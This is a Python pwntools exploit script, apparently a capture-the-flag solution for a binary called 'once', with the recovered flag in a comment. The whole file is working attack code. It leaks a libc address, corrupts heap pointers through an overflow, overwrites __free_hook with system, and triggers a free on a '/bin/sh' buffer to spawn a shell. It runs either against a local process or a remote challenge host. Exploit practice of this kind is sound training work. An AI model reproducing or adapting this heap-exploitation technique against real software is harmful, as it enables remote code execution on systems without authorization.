from pwn import *
from ctypes import *
debug = 1
elf = ELF('./once')
#flag{t1-1_1S_0_sImPl3_n0T3}
if debug:
	p = process('./once')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	context.log_level = 'debug'
	gdb.attach(p)
else:
	p = remote('47.75.189.102', 9999)
	libc = ELF('./libc-2.23.so')
	#off = 0x001b0000
	context.log_level = 'debug'
p.recvuntil('>')
p.sendline('0')
p.recvuntil('Invalid choice\n')
libc.address = int(p.recvuntil('>')[:-1],16)-libc.symbols['puts']

#add a node
p.sendline('1')
#f4:ptr=malloc 0xe0
p.recvuntil('>')
p.sendline('4')
p.recvuntil('>')
p.sendline('1')
p.recvuntil('size:')
p.sendline(str(0xe0))
p.recvuntil('>')
p.sendline('4')
p.recvuntil('>')
#input node 
p.sendline('2')
p.send('a'*16+'b'*8 + chr(0x58))

p.recvuntil('>')
#remove node
p.sendline('3')
p.recvuntil('>')
#write ptr
p.sendline('4')
p.recvuntil('>')
p.sendline('2')
p.send('/bin/sh\0'+ '\0'*0x10 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['_IO_2_1_stdout_'] )+ p64(0) + p64(libc.symbols['_IO_2_1_stdin_']) + p64(0)*2 + p64(next(libc.search('/bin/sh'))) +p64(0)*4 )
p.recvuntil('>')
p.sendline('4')
p.recvuntil('>')
p.sendline('2')
p.send(p64(libc.symbols['system']))
p.recvuntil('>')
p.sendline('4')
p.recvuntil('>')
p.sendline('3')
print '[*] system ',hex(libc.symbols['system'])


p.interactive()

#0x08048e48 : add esp, 0x1c ; ret
